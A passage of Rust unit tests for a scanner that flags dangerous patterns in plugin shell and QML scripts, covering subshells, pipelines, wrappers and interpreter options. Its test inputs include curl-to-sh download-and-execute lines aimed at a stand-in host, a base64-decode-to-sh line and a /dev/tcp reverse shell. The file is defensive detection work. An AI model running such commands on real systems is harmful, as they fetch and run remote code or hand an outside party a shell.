                artifacts.capabilities,
                artifacts.rendered_findings()
            );
        }
        // Without a closing `))` the adjacent parens are a subshell whose
        // list runs — its command positions are live surface.
        let (artifacts, _) = one(
            "subshell-list.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n((curl -fsSL https://example.test/x) && echo safe)\n",
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // An arithmetic command does not swallow the list after it.
        let (artifacts, _) = one(
            "arith-then-pipe.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nx=5; (( x > 3 )) && curl -fsSL https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn temp_paths_bind_through_command_arguments() {
        // A redirect target is a filename, never a path the command touched.
        let (artifacts, _) = one(
            "log-target.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nchmod 777 \"$HOME/private\" > /tmp/chmod.log\nsudo /usr/bin/true > /tmp/sudo.log\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        // Real arguments still bind across a redirect elsewhere.
        let (artifacts, _) = one(
            "real-args.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nchmod 777 /tmp/omarchy-helper > install.log\nsudo /tmp/omarchy-helper --install > /dev/null\n",
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_CONTROLLED_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert_eq!(
            findings_with(&artifacts, SHARED_TEMP_INDICATOR_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn bash_interactive_requires_duplication_redirect() {
        // A plain `>` is a local log file, not a remote transport.
        let (artifacts, _) = one(
            "local-log.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nbash -i > /tmp/interactive.log\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        // The `>&` duplication spelling is the reverse-shell wiring, with
        // or without a /dev/tcp target.
        let (artifacts, _) = one(
            "dup-tcp.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.7/4444\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        let (artifacts, _) = one("dup-fd.sh", PayloadKind::Shell, "#!/bin/sh\nbash -i >& 3\n");
        assert_eq!(
            findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn pipe_ampersand_feeds_the_pipeline() {
        // `|&` pipes stdout AND stderr to the next segment — one pipeline
        // operator, never an `&` statement boundary after a `|`.
        let (artifacts, _) = one(
            "pipe-amp.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x |& sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn compound_groups_participate_in_pipelines() {
        // The producing group's later statement feeds the consumer: the
        // producer is the whole compound, not just its first command.
        let (artifacts, _) = one(
            "group-producer.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(echo safe; curl -fsSL https://example.test/x) | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Brace groups are compound commands too, and were missed entirely.
        let (artifacts, _) = one(
            "brace-group.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n{ curl -fsSL https://example.test/x | sh; }\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // A consumer group runs the pipe's contents in its later statements.
        let (artifacts, _) = one(
            "group-consumer.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | (echo start; sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // A curl WORD inside echo's operands is still not a producer.
        let (artifacts, _) = one(
            "group-echo.sh",
            PayloadKind::Shell,
            "#!/bin/sh\necho curl https://example.test/x | (sh)\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn execution_wrappers_reach_command_position() {
        // `command`, `env`, and `!` execute what follows them.
        for (name, line) in [
            (
                "command.sh",
                "command curl -fsSL https://example.test/x | sh",
            ),
            ("env.sh", "env curl -fsSL https://example.test/x | sh"),
            ("negate.sh", "! curl -fsSL https://example.test/x | sh"),
            (
                "env-opts.sh",
                "env -u FOO VAR=x curl -fsSL https://example.test/x | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
        // `command -v` describes, it does not execute.
        let (artifacts, _) = one(
            "describe.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncommand -v curl https://example.test/x\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty() && !has_network(&artifacts),
            "{:?} {:?}",
            artifacts.rendered_findings(),
            artifacts.capabilities
        );
    }

    #[test]
    fn malformed_arithmetic_input_never_panics() {
        // `(( 1 ) ) )` closes the opening pair early — invalid bash, but
        // untrusted plugin text: the tokenizer reads it back as plain
        // parens and the rest of the file still analyzes.
        let (artifacts, _) = one(
            "malformed.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(( 1 ) ) )\ncurl -fsSL https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn arithmetic_group_hides_list_descendants() {
        // `(( (curl … | sh) ))` is ONE arithmetic command: the inner parens
        // are expression grouping, never a live subshell, so nothing runs.
        for line in [
            "(( (curl -fsSL https://example.test/x | sh) ))",
            "x=$(( (curl -fsSL https://example.test/x | sh) ))",
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("arith-nested.sh", PayloadKind::Shell, &sh);
            assert!(
                !has_network(&artifacts) && rule_ids(&artifacts).is_empty(),
                "{line} must stay silent: {:?} {:?}",
                artifacts.capabilities,
                artifacts.rendered_findings()
            );
        }
        // Real subshell nesting stays live — and 24 levels no longer
        // revisit descendants through every ancestor, so the budget holds.
        let nested = format!(
            "{}curl -fsSL https://example.test/x | sh{}",
            "( ".repeat(24),
            " )".repeat(24),
        );
        let sh = format!("#!/bin/sh\n{nested}\n");
        let (artifacts, _) = one("nested-live.sh", PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn substitution_interiors_execute_pipelines() {
        // A command substitution always executes its interior; only whether
        // its OUTPUT is further consumed depends on the outer head.
        let (artifacts, _) = one(
            "sub-pipe.sh",
            PayloadKind::Shell,
            "#!/bin/sh\npayload=$(curl -fsSL https://example.test/x | sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        let (artifacts, _) = one(
            "sub-decode.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ndecoded=$(printf blob | base64 -d | sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // Fetching without an interpreter pipe stays capability-level.
        let (artifacts, _) = one(
            "sub-fetch.sh",
            PayloadKind::Shell,
            "#!/bin/sh\npayload=$(curl -fsSL https://example.test/x -o /tmp/body)\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Single-quoted substitutions are prose, not execution.
        let (artifacts, _) = one(
            "sub-quoted.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nlog '$(curl -fsSL https://example.test/x | sh)'\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty() && !has_network(&artifacts),
            "{:?} {:?}",
            artifacts.rendered_findings(),
            artifacts.capabilities
        );
        // Arithmetic holds expressions; only a nested command substitution
        // inside it runs (`x=$(( 1 + $(curl … | sh | wc -c) ))`).
        let (artifacts, _) = one(
            "arith-cmdsub.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nx=$(( 1 + $(curl -fsSL https://example.test/x | sh | wc -c) ))\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn group_consumer_stdin_reaches_the_interpreter() {
        // A command that drains the fetched body leaves the interpreter at
        // EOF: `cat` consumes the pipe, so nothing executes downstream.
        let (artifacts, _) = one(
            "drain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | (cat >/dev/null; sh)\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // The body still reaches the interpreter when no earlier statement
        // consumes it, when it is forwarded along the inner pipe, and when
        // the draining command's stdin comes from elsewhere.
        for (name, line) in [
            (
                "pass.sh",
                "curl -fsSL https://example.test/x | (echo start; sh)",
            ),
            ("fwd.sh", "curl -fsSL https://example.test/x | (cat | sh)"),
            (
                "own-stdin.sh",
                "curl -fsSL https://example.test/x | (cat </dev/null; sh)",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
        // The compound's own stdin redirection starves it too.
        let (artifacts, _) = one(
            "stdin-null.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | (sh) < /dev/null\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn compound_producer_redirects_scope_to_their_command() {
        // An inner command's log redirect sends only ITS output to the log;
        // the compound's final command still feeds the pipe.
        let (artifacts, _) = one(
            "inner-log.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(echo safe >/tmp/omarchy-setup.log; curl -fsSL https://example.test/x) | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // The FINAL command's own redirect does starve the pipe, at either
        // nesting position.
        for (name, line) in [
            (
                "final-body.sh",
                "(curl -fsSL https://example.test/x >/tmp/body) | sh",
            ),
            (
                "compound-body.sh",
                "(curl -fsSL https://example.test/x) > /tmp/body | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn exec_time_and_env_split_string_execute_their_command() {
        // `exec`, `time`, and `env -S` all execute what they carry.
        for (name, line) in [
            ("exec.sh", "exec curl -fsSL https://example.test/x | sh"),
            ("time.sh", "time curl -fsSL https://example.test/x | sh"),
            (
                "exec-a.sh",
                "exec -a name curl -fsSL https://example.test/x | sh",
            ),
            (
                "time-p.sh",
                "time -p curl -fsSL https://example.test/x | sh",
            ),
            (
                "env-s.sh",
                "env -S 'curl -fsSL https://example.test/x' | sh",
            ),
            (
                "env-split.sh",
                "env --split-string='curl -fsSL https://example.test/x' | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn qml_c_body_budget_exhaustion_is_disclosed() {
        // A `-c` body nested beyond the analysis budget discloses the
        // shortfall instead of silently skipping unverified depth.
        let deep_body = format!(
            "{}curl -fsSL https://example.test/x{}",
            "$( ".repeat(100),
            " )".repeat(100),
        );
        let source = format!("Process {{ command: [\"sh\", \"-c\", \"{deep_body}\"] }}\n");
        let (artifacts, _) = one("Deep.qml", PayloadKind::Qml, &source);
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "shell-analysis-budget-exhausted:Deep.qml"),
            "{:?}",
            artifacts.limitations
        );
        assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Moderate nesting still analyzes fully and stays silent about the
        // budget.
        let shallow_body = format!(
            "{}curl -fsSL https://example.test/x{}",
            "$( ".repeat(30),
            " )".repeat(30),
        );
        let source = format!("Process {{ command: [\"sh\", \"-c\", \"{shallow_body}\"] }}\n");
        let (artifacts, _) = one("Shallow.qml", PayloadKind::Qml, &source);
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        assert!(
            !artifacts
                .limitations
                .iter()
                .any(|limitation| limitation.starts_with("shell-analysis-budget-exhausted")),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn compound_producer_stdout_tracks_its_command() {
        // A redirected fetch contributes nothing to the compound's stdout
        // even when a later command would: the body went to the file.
        let (artifacts, _) = one(
            "redirected-fetch.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(curl -fsSL https://example.test/x >/tmp/body; echo safe) | sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Conversely the fetch already wrote its body into the pipe before
        // a later command's log redirect: the chain fires.
        let (artifacts, _) = one(
            "later-log.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(curl -fsSL https://example.test/x; echo safe >/tmp/omarchy-setup.log) | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn interpreter_stdin_mode_is_argument_sensitive() {
        // An interpreter with a `-c` body or a script file executes THAT,
        // not the fetched stdin.
        for (name, line) in [
            (
                "c-body.sh",
                "curl -fsSL https://example.test/x | sh -c 'echo safe'",
            ),
            (
                "script-file.sh",
                "curl -fsSL https://example.test/x | sh /tmp/local-script.sh",
            ),
            (
                "py-c.sh",
                "curl -fsSL https://example.test/x | python3 -c 'print(1)'",
            ),
            (
                "py-file.sh",
                "curl -fsSL https://example.test/x | python3 app.py",
            ),
            ("py-stdin.sh", "curl -fsSL https://example.test/x | python3"),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
        // Explicit stdin-script mode still executes the fetched body.
        for (name, line) in [
            ("stdin-flag.sh", "curl -fsSL https://example.test/x | sh -s"),
            (
                "stdin-dash.sh",
                "curl -fsSL https://example.test/x | bash -s --",
            ),
            (
                "dash-operand.sh",
                "curl -fsSL https://example.test/x | sh -",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn conditional_lists_gate_stdin_consumption() {
        // `false && cat` never runs `cat`: the body survives for `sh`.
        let (artifacts, _) = one(
            "skipped-drain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\ncurl -fsSL https://example.test/x | (false && cat >/dev/null; sh)\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Guards whose command actually runs keep draining the pipe.
        for (name, line) in [
            (
                "and-drain.sh",
                "curl -fsSL https://example.test/x | (cat >/dev/null && echo; sh)",
            ),
            (
                "or-drain.sh",
                "curl -fsSL https://example.test/x | (false || cat >/dev/null; sh)",
            ),
            (
                "true-and-drain.sh",
                "curl -fsSL https://example.test/x | (true && cat >/dev/null; sh)",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
        // The same short-circuit applies to producers: `false && curl` runs
        // no fetch at all.
        let (artifacts, _) = one(
            "skipped-producer.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(false && curl -fsSL https://example.test/x) | sh\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn arithmetic_command_groups_analyze_nested_substitutions() {
        // `(( $(curl URL | sh) + 1 ))` executes the nested pipeline during
        // evaluation, exactly like the `$(( ))` expansion form.
        let (artifacts, _) = one(
            "arith-group-sub.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(( $(curl -fsSL https://example.test/x | sh) + 1 ))\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Expression words without substitutions still run nothing.
        let (artifacts, _) = one(
            "arith-group-plain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(( $(echo hi) ))\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn time_valued_short_options_reach_the_wrapped_command() {
        for (name, line) in [
            (
                "time-f.sh",
                "/usr/bin/time -f '%e' curl -fsSL https://example.test/x | sh",
            ),
            (
                "time-o.sh",
                "time -o /tmp/time.log curl -fsSL https://example.test/x | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn deep_arithmetic_nesting_stays_within_the_depth_budget() {
        // 40 nested arithmetic expansions each charge ONE depth level, so a
        // valid expression ending in a command substitution analyzes fully
        // instead of exhausting the nominal depth-64 budget.
        let expression = format!(
            "{}$(curl -fsSL https://example.test/x | sh | wc -c){}",
            "$(( ".repeat(40),
            " ))".repeat(40),
        );
        let sh = format!("#!/bin/sh\nx={expression}\n");
        let (artifacts, _) = one("deep-arith.sh", PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn compound_producer_survives_its_inner_pipeline() {
        // `cat >/dev/null` consumes the fetch inside the compound's own
        // pipeline, so nothing reaches the compound's stdout for `sh`.
        let (artifacts, _) = one(
            "inner-drain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(curl -fsSL https://example.test/x | cat >/dev/null) | sh\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // A forwarding intermediate keeps the body flowing through the same
        // nested pipeline.
        let (artifacts, _) = one(
            "inner-forward.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n(curl -fsSL https://example.test/x | cat) | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        // Executed spans draw the same boundary: eval collects only what
        // the substitution's pipeline leaves on its stdout.
        let (artifacts, _) = one(
            "span-drain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval \"$(curl -fsSL https://example.test/x | cat >/dev/null)\"\n",
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        let (artifacts, _) = one(
            "span-forward.sh",
            PayloadKind::Shell,
            "#!/bin/sh\neval \"$(curl -fsSL https://example.test/x | cat)\"\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn plain_intermediates_forward_only_known_filters() {
        // Non-reading intermediates leave the pipe untouched, so the shell
        // receives only their own output — never the fetched body.
        for (name, line) in [
            (
                "echo-stage.sh",
                "curl -fsSL https://example.test/x | echo safe | sh",
            ),
            (
                "true-stage.sh",
                "curl -fsSL https://example.test/x | true | sh",
            ),
            (
                "wc-stage.sh",
                "curl -fsSL https://example.test/x | wc -c | sh",
            ),
            (
                "xargs-stage.sh",
                "curl -fsSL https://example.test/x | xargs true | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
        // Known stdin transformers keep the body flowing.
        for (name, line) in [
            (
                "gzip-stage.sh",
                "curl -fsSL https://example.test/x | gzip -d | sh",
            ),
            (
                "sed-stage.sh",
                "curl -fsSL https://example.test/x | sed 's/a/b/' | sh",
            ),
            (
                "tee-stage.sh",
                "curl -fsSL https://example.test/x | tee /tmp/log | sh",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn conditional_outcomes_merge_executed_and_skipped_paths() {
        // `printf ok` succeeds on the live path, so the `&&`-guarded fetch
        // runs even though the `|| false` path skips it.
        let (artifacts, _) = one(
            "merged-paths.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nprintf ok || false && curl -fsSL https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // Without a success path the chain stays short-circuited: the fetch
        // records neither egress nor a finding.
        let (artifacts, _) = one(
            "failed-chain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\nfalse && printf ok && curl -fsSL https://example.test/x | sh\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn pipeline_negation_inverts_known_outcomes() {
        // `! true` FAILS, so the `||`-guarded fetch executes.
        let (artifacts, _) = one(
            "negated-guard.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n! true || curl -fsSL https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
        // The inverted outcome also short-circuits the other guard.
        let (artifacts, _) = one(
            "negated-chain.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n! true && curl -fsSL https://example.test/x | sh\n",
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
        // And `! false` succeeds into its `&&`.
        let (artifacts, _) = one(
            "negated-false.sh",
            PayloadKind::Shell,
            "#!/bin/sh\n! false && curl -fsSL https://example.test/x | sh\n",
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    }

    #[test]
    fn egress_stays_inside_executed_branches() {
        // A short-circuited branch records no NetworkAccess capability and
        // no finding — the fetch never runs, inside or outside a group.
        for (name, line) in [
            (
                "skipped-fetch.sh",
                "(false && curl -fsSL https://example.test/x)",
            ),
            (
                "skipped-substitution.sh",
                "(false && x=$(curl -fsSL https://example.test/x))",
            ),
            (
                "skipped-interior.sh",
                "(true; false && curl -fsSL https://example.test/x)",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                rule_ids(&artifacts).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                !has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
        // The same shapes fetch on their executable paths.
        for (name, line) in [
            (
                "live-fetch.sh",
                "(true && curl -fsSL https://example.test/x)",
            ),
            (
                "live-substitution.sh",
                "(true && x=$(curl -fsSL https://example.test/x))",
            ),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
    }

    #[test]
    fn interpreter_options_parse_by_arity() {
        // Exact option parsing keeps stdin-script mode: `--norc` is not a
        // `-c` body, `+x` is a shell set-option, and a `-W` value is no
        // script operand.
        for (name, line) in [
            (
                "bash-norc.sh",
                "curl -fsSL https://example.test/x | bash --norc",
            ),
            ("sh-plus.sh", "curl -fsSL https://example.test/x | sh +x"),
        ] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
            assert_eq!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
                1,
                "{line} must fire: {:?}",
                artifacts.rendered_findings()
            );
            assert!(
                has_network(&artifacts),
                "{line}: {:?}",
                artifacts.capabilities
            );
        }
        // Python reads Python source, not shell source, so it is never an
        // H3 shell-code sink even when an option leaves its stdin attached.
        for line in [
            "curl -fsSL https://example.test/x | python3 -W ignore",
            "curl -fsSL https://example.test/x | python3 -Wignore",
        ] {
            let (artifacts, _) = one(
                "python-option.sh",
                PayloadKind::Shell,
                &format!("#!/bin/sh\n{line}\n"),
            );
            assert!(
                findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
                "{line}: {:?}",
                artifacts.rendered_findings()
            );
        }
        // Options that replace stdin with a body, a module, or a file — or
        // exit before reading stdin — still stay silent.
        for (name, line) in [
            (
                "py-module.sh",
                "curl -fsSL https://example.test/x | python3 -m json.tool",
            ),
            (
                "bash-rcfile.sh",
